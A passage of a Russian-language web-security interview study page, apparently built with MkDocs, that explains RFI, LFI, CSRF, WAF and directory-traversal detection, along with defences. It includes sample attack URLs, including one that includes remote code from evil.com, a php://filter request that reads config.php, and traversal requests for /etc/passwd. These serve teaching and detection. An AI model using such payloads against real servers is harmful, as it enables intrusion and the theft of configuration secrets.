+<p>✅ <strong>4. Использовать Access Control List (ACL)</strong> - Настроить чёткие <strong>разрешения</strong> на доступ к объектам.</p>
+<p>✅ <strong>5. Логировать подозрительные запросы</strong> - Если один IP-адрес запрашивает <strong>разные ID подряд</strong>, это может быть атакой.</p>
+<h2 id="6-rfi-remote-file-inclusion">🔹 6. Что такое RFI (Remote File Inclusion) и как защититься.</h2>
+<blockquote>
+<p><strong>RFI (Удалённое включение файлов)</strong> – это уязвимость, при которой злоумышленник может загрузить и выполнить <strong>внешний (удалённый) файл</strong> на сервере жертвы.</p>
+</blockquote>
+<p><strong>Как работает RFI?</strong></p>
+<p><strong>📌 Загрузка вредоносного кода.</strong></p>
+<p>Допустим, у нас есть PHP-код, который загружает страницу по параметру <code>page</code>:</p>
+<p><code>&lt;?php include($_GET['page']); ?&gt;</code></p>
+<p>🔴 <strong>Проблема</strong>: код <strong>подключает файл без проверки</strong>, откуда он загружается.</p>
+<p>🔹 Запрос, который использует атаку:</p>
+<p><code>https://example.com/index.php?page=http://evil.com/malware.php</code></p>
+<p>Если сервер не защищён, он скачает и выполнит <strong><code>malware.php</code></strong> с атакующего сервера. Теперь злоумышленник может <strong>выполнить любой код</strong> на сервере жертвы!</p>
+<p><strong>📌  Чтение конфиденциальных данных</strong></p>
+<p>Если сервер разрешает <code>file://</code> или <code>php://</code>, злоумышленник может украсть файлы, например, <code>config.php</code>:</p>
+<p><code>https://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php</code></p>
+<p>Сервер выдаст <code>config.php</code> в Base64, и злоумышленник сможет расшифровать его.</p>
+<p><strong>Как защититься от RFI?</strong></p>
+<p>✅ <strong>1. Отключить <code>allow_url_include</code> в PHP</strong></p>
+<p><code>allow_url_include = Off</code></p>
+<p>✅ <strong>2. Фильтровать входные данные</strong> - Использовать <strong>белый список разрешённых файлов</strong>:</p>
+<p>✅ <strong>3. Использовать абсолютные пути</strong></p>
+<p>✅ <strong>4. Ограничить права сервера</strong></p>
+<ul>
+<li>
+<p>Запретить исполнение PHP-кода в <code>uploads/</code></p>
+</li>
+<li>
+<p>Использовать <code>chmod 640</code> для важных файлов</p>
+</li>
+</ul>
+<p>✅ <strong>5. Включить <code>WAF</code> (Web Application Firewall)</strong>  </p>
+<p>WAF (например, ModSecurity) может блокировать RFI-атаки <strong>до их выполнения</strong>.</p>
+<h2 id="7-lfi-local-file-inclusion">🔹 7. Что такое LFI (Local File Inclusion) и как защититься.</h2>
+<blockquote>
+<p><strong>LFI (Локальное включение файлов)</strong> – это уязвимость, при которой злоумышленник может получить доступ к локальным файлам сервера и даже выполнить код.</p>
+</blockquote>
+<p>📌 <strong>Что может сделать атакующий?</strong></p>
+<ul>
+<li>
+<p>Прочитать <strong>конфиденциальные файлы</strong> (например, <code>/etc/passwd</code>)</p>
+</li>
+<li>
+<p>Получить <strong>доступ к исходному коду</strong></p>
+</li>
+<li>
+<p>Запустить <strong>PHP-код через логи или загрузки</strong></p>
+</li>
+<li>
+<p>Перехватить <strong>учётные данные или токены</strong></p>
+</li>
+</ul>
+<p>Пример:
+<code>https://example.com/index.php?page=../../../../etc/passwd</code></p>
+<p>Тут происходит выход на директории выше и получение данных из файла с паролем.</p>
+<p><strong>3. Как защититься от LFI?</strong></p>
+<p>✅ <strong>1. Использовать белый список файлов</strong></p>
+<p>✅ <strong>2. Использовать абсолютные пути</strong></p>
+<p>✅ <strong>3. Запретить выполнение PHP в загрузках и логах</strong></p>
+<p>✅ <strong>4. Ограничить права сервера</strong></p>
+<p>✅ <strong>5. Включить WAF (Web Application Firewall)</strong></p>
+<h2 id="8-csrf">🔹 8. Что такое CSRF.</h2>
+<blockquote>
+<p><strong>CSRF (Межсайтовая подделка запроса)</strong> – это уязвимость, при которой злоумышленник заставляет пользователя выполнить <strong>нежелательный запрос</strong> к веб-сайту, на котором он уже авторизован.</p>
+</blockquote>
+<p>📌 <strong>Что может сделать атакующий?</strong></p>
+<ul>
+<li>
+<p>Изменить <strong>пароль аккаунта</strong> жертвы</p>
+</li>
+<li>
+<p>Перевести <strong>деньги со счёта</strong> жертвы</p>
+</li>
+<li>
+<p>Отправить <strong>запросы от имени пользователя</strong></p>
+</li>
+</ul>
+<p><strong>Как защититься от CSRF?</strong></p>
+<p>✅ <strong>1. Использовать CSRF-токены</strong> - При каждом запросе сервер должен требовать <strong>уникальный токен</strong>.</p>
+<p>✅ <strong>2. Использовать SameSite в cookies</strong> - Запретить отправку cookies с внешних сайтов.</p>
+<p>✅ <strong>3. Проверять заголовок Origin/Referer</strong> - Сервер должен проверять, откуда пришёл запрос.</p>
+<p>✅ <strong>4. Отключить небезопасные методы (GET для действий)</strong> - Запросы, которые изменяют данные (<code>POST</code>, <code>DELETE</code>), <strong>не должны использовать GET</strong>.</p>
+<p>✅ <strong>5. Использовать CORS (Cross-Origin Resource Sharing)</strong> - Запретить выполнение запросов с других доменов, если это не требуется.</p>
+<h2 id="9-waf">🔹 9. Что такое WAF.</h2>
+<blockquote>
+<p>Web application firewall (WAF) — это совокупность программных мониторов и фильтров, предназначенных для обнаружения и блокирования сетевых атак на веб-приложение.</p>
+</blockquote>
+<p>WAF устанавливается перед защищаемым веб ресурсом и анализирует все передаваемые HTTP запросы на наличие вредоносного кода и потенциально опасную активность злоумышленников. При проведении анализа WAF основывается на различных механизмах сигнатурного анализа, правилах, средствах анализа аномалий. Также в своей работе WAF могут использовать нейросети и различные индикаторы атак.</p>
+<p>В случае обнаружения плохих запросов WAF может выполнить следующие действия: удалить из запроса опасные данные по аналогии с тем, как антивирус пытается лечить зараженные файлы, также запрос может быть заблокирован целиком. Так возможна блокировка источника атаки на сетевом уровне, то есть, мы блокируем все обращения с данного IP. Кроме того, WAF ориентирован на выявление атак из списка OWASP Top 10.</p>
+<h2 id="10-directory-traversal">🔹 10. Как ты будешь детектировать попытку атаки обхода директории (directory traversal).</h2>
+<p><strong>Анализ логов веб-сервера</strong></p>
+<p>✅  Буду искать подозрительные запросы с <code>../</code>, <code>%2e%2e/</code>, <code>%252e%252e/</code> и их вариациями.
+Примеры запросов:</p>
+<p><code>GET /../../../etc/passwd HTTP/1.1</code></p>
+<p><code>GET /..%2F..%2F..%2Fwindows/system32/cmd.exe HTTP/1.1</code></p>
+<p><strong>🔹 Фильтрация входных данных</strong></p>
+<p>✅ Буду проверять параметры URL и формы на наличие <code>../</code>, <code>..\</code> или их закодированных вариантов (<code>%2e%2e</code>, <code>%252e%252e</code>).</p>
+<p>✅ Буду запрещать относительные пути в пользовательском вводе.</p>
+<p><strong>🔹 Использование WAF (Web Application Firewall)</strong>    </p>
+<p>✅ Современные WAF могут блокировать подозрительные запросы с характерными паттернами обхода директорий.</p>
+<p><strong>🔹 Мониторинг файловой системы</strong></p>
+<p>✅ Если приложение внезапно запрашивает доступ к запрещённым файлам (например, <code>/etc/passwd</code>, <code>C:\Windows\system32</code>), это признак атаки.</p>
+<p><strong>🔹 Контроль прав доступа</strong></p>
+<p>✅ Даже если атака произошла, правильные права доступа предотвратят чтение критических файлов.</p>
+<p><strong>🔹 Обнаружение аномалий в поведении пользователей</strong></p>
+<p>✅ Необычно частые 404-ошибки могут указывать на попытки перебора путей.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../analyse_siem/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Анализ логов SIEM">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Анализ логов SIEM
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../obshie/" class="md-footer__link md-footer__link--next" aria-label="Next: Общие вопросы">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Общие вопросы
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025 Олег Тарасов
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://t.me/objoracoda" target="_blank" rel="noopener" title="t.me" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm4.962 7.224c.1-.002.321.023.465.14a.5.5 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024q-.159.037-5.061 3.345-.72.495-1.302.48c-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789q.04-.324.893-.663 5.247-2.286 6.998-3.014c3.332-1.386 4.025-1.627 4.476-1.635"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/objoracoda" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "content.ode.copy", "content.tabs.link", "announce.dismiss", "navigation.footer", "header.autohide", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.path", "navigation.tracking", "search.hilight", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
